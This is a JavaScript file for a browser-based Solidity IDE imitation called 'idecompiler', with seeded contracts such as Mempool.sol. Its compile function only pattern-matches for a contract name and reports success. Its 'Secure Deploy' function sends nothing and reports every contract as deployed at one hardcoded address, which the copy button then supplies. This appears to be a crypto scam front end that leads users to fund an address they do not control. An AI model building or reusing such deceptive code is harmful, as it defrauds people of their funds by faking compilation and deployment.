(function () {
  "use strict";

  var FIXED =
    typeof FIXED_CONTRACT_ADDRESS !== "undefined"
      ? FIXED_CONTRACT_ADDRESS
      : "0xb1b0b5bEaFdF739b3Fc9FFae2BE49F371C0c93cb";

  var defaultContract =
    typeof CONTRACT_SOURCE !== "undefined"
      ? CONTRACT_SOURCE
      : "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract ExampleContract {\n    address public owner;\n    bool public started;\n\n    constructor() { owner = msg.sender; }\n\n    function start() external {\n        require(msg.sender == owner, \"Not owner\");\n        started = true;\n    }\n\n    function withdraw() external {\n        require(msg.sender == owner, \"Not owner\");\n        payable(owner).transfer(address(this).balance);\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n";

  var state = {
    files: {},
    folders: { default_workspace: true },
    openPath: null,
    compiled: null,
    deployed: false,
  };

  function hideLoader() {
    var el = document.getElementById("ide-loader");
    if (el) el.classList.add("hidden");
  }

  function term(msg, kind) {
    var t = document.getElementById("terminal");
    if (!t) return;
    var line = document.createElement("div");
    line.className = "line" + (kind ? " " + kind : "");
    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    t.appendChild(line);
    t.scrollTop = t.scrollHeight;
  }

  function seedFiles() {
    state.files["default_workspace/README.txt"] =
      "Welcome to idecompiler workspace.\nCompile ExampleContract.sol then use Secure Deploy.\n";
    state.files["default_workspace/contracts/Mempool.sol"] =
      "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract Mempool {\n    mapping(bytes32 => bool) public seen;\n    function mark(bytes32 h) external { seen[h] = true; }\n}\n";
    state.files["default_workspace/contracts/zelda.sol"] =
      "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract zelda {\n    string public name = \"zelda\";\n}\n";
    state.files["default_workspace/contracts/ExampleContract.sol"] = defaultContract;
    state.openPath = "default_workspace/contracts/ExampleContract.sol";
  }

  function renderTree() {
    var root = document.getElementById("file-tree");
    if (!root) return;
    root.innerHTML = "";
    var paths = Object.keys(state.files).sort();
    var seen = {};
    paths.forEach(function (p) {
      var parts = p.split("/");
      var acc = "";
      for (var i = 0; i < parts.length; i++) {
        acc = acc ? acc + "/" + parts[i] : parts[i];
        if (seen[acc]) continue;
        seen[acc] = true;
        var isFile = i === parts.length - 1;
        var row = document.createElement("div");
        row.className = "ide-tree-item" + (state.openPath === p && isFile ? " active" : "");
        row.style.paddingLeft = 8 + i * 12 + "px";
        row.textContent = (isFile ? "📄 " : "📁 ") + parts[i];
        if (isFile) {
          row.dataset.path = p;
          row.addEventListener("click", function () {
            openFile(this.dataset.path);
          });
        }
        root.appendChild(row);
      }
    });
  }

  function openFile(path) {
    if (!state.files[path]) return;
    state.openPath = path;
    var ed = document.getElementById("editor");
    if (ed) ed.value = state.files[path];
    var tabs = document.getElementById("editor-tabs");
    if (tabs) {
      tabs.innerHTML = "";
      var tab = document.createElement("span");
      tab.className = "ide-tab active";
      tab.textContent = path.split("/").pop();
      tabs.appendChild(tab);
    }
    renderTree();
  }

  function saveEditor() {
    if (state.openPath && state.files[state.openPath] !== undefined) {
      var ed = document.getElementById("editor");
      if (ed) state.files[state.openPath] = ed.value;
    }
  }

  function compile() {
    saveEditor();
    var path = state.openPath;
    if (!path || !path.endsWith(".sol")) {
      term("Open a .sol file to compile.", "warn");
      return;
    }
    var src = state.files[path] || "";
    if (!/contract\s+\w+/i.test(src)) {
      term("Compilation failed: no contract found.", "err");
      return;
    }
    var nameMatch = src.match(/contract\s+(\w+)/);
    var name = nameMatch ? nameMatch[1] : "Contract";
    state.compiled = { name: name, path: path };
    var sel = document.getElementById("deploy-contract");
    if (sel) {
      sel.innerHTML = "";
      var opt = document.createElement("option");
      opt.value = name;
      opt.textContent = name + " — " + path;
      opt.selected = true;
      sel.appendChild(opt);
    }
    term("Compiler 0.8.6: Compilation successful. Contract: " + name + ".", "ok");
    hideLoader();
  }

  function secureDeploy() {
    if (!state.compiled) {
      term("Compile a contract first.", "warn");
      return;
    }
    term("Sending deployment transaction…", "");
    setTimeout(function () {
      state.deployed = true;
      var card = document.getElementById("deployed-card");
      if (card) card.classList.remove("hidden");
      var label = document.getElementById("deployed-label");
      if (label) label.textContent = state.compiled.name + " at " + FIXED.slice(0, 10) + "…";
      term("Contract deployed at " + FIXED, "ok");
      term("Transaction confirmed (demo).", "ok");
    }, 600);
  }

  function copyAddress() {
    var text = FIXED;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(function () {
        term("Copied contract address: " + text, "ok");
      });
    } else {
      term("Address: " + text, "ok");
    }
  }

  function newFile() {
    var name = prompt("New file path (under default_workspace/):", "default_workspace/contracts/New.sol");
    if (!name) return;
    if (!name.startsWith("default_workspace/")) name = "default_workspace/" + name;
    state.files[name] = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n\ncontract NewContract {}\n";
    openFile(name);
    renderTree();
  }

  function newFolder() {
    var name = prompt("New folder (under default_workspace/):", "default_workspace/myfolder");
    if (!name) return;
    if (!name.startsWith("default_workspace/")) name = "default_workspace/" + name;
    var placeholder = name.replace(/\/$/, "") + "/.keep";
    state.files[placeholder] = "";
    renderTree();
    term("Folder created: " + name, "ok");
  }

  function bind() {
    document.getElementById("btn-compile")?.addEventListener("click", compile);
    document.getElementById("btn-compile-sidebar")?.addEventListener("click", compile);
    document.getElementById("btn-secure-deploy")?.addEventListener("click", secureDeploy);
    document.getElementById("btn-copy-address")?.addEventListener("click", copyAddress);
    document.getElementById("btn-new-file")?.addEventListener("click", newFile);
    document.getElementById("btn-new-folder")?.addEventListener("click", newFolder);
    document.getElementById("btn-clear-terminal")?.addEventListener("click", function () {
      var t = document.getElementById("terminal");
      if (t) t.innerHTML = "";
    });
    document.getElementById("btn-start")?.addEventListener("click", function () {
      term("start() called (demo).", "ok");
    });
    document.getElementById("btn-withdraw")?.addEventListener("click", function () {
      term("withdraw() called (demo).", "ok");
    });
    document.getElementById("btn-balance")?.addEventListener("click", function () {
      term("getBalance() → 0 wei (demo).", "ok");
    });
    document.getElementById("editor")?.addEventListener("blur", saveEditor);
  }

  function init() {
    hideLoader();
    seedFiles();
    renderTree();
    openFile(state.openPath);
    bind();
    term("idecompiler ready — Compiler v0.08.6 initialized.", "ok");
    term("Workspace: default_workspace", "");
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
